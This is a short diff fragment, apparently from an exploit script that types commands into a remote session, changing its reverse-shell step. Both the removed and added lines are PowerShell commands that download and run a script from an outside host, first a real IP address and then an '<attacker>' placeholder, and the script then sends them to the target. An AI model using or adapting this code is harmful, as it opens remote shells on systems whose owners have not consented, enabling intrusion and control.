@@ -196,7 +196,7 @@ send_enter(url, sid)
 
 
 # Reverse Shell
-rev_shell_txt = "IEX((New-Object System.Net.WebClient).DownloadString('http://45.33.88.161:8002/a.ps1'))"
+rev_shell_txt = "IEX((New-Object System.Net.WebClient).DownloadString('http://<attacker>:8002/rev.ps1'))"
 send_text(url, sid, rev_shell_txt)
 send_enter(url, sid)
 ```
